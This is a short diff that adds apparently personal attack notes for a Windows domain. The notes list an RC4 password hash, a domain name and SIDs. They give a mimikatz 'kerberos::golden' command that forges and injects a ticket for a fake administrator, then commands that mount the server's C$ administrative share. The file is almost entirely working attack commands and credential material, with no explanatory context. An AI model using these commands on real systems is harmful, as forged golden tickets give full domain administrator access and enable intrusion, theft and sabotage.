@@ -1,0 +1,9 @@
+cr4: e7111664b88b4b058010fde4aa37fec1
+domain: winsrv2008.local
+sid: S-1-5-21-4220747943-3152432350-320651364-500
+kerberos::golden /domain:winsrv2008.local /sid:S-1-5-21-4220747943-3152432350-320651364 /rc4:e7111664b88b4b058010fde4aa37fec1 /id:500 /user:FakeAdmin /ptt
+
+sid krbtgt: S-1-5-21-4220747943-3152432350-320651364-502
+
+net use O: \\winsrv\c$
+pushd \\winsrv\c$
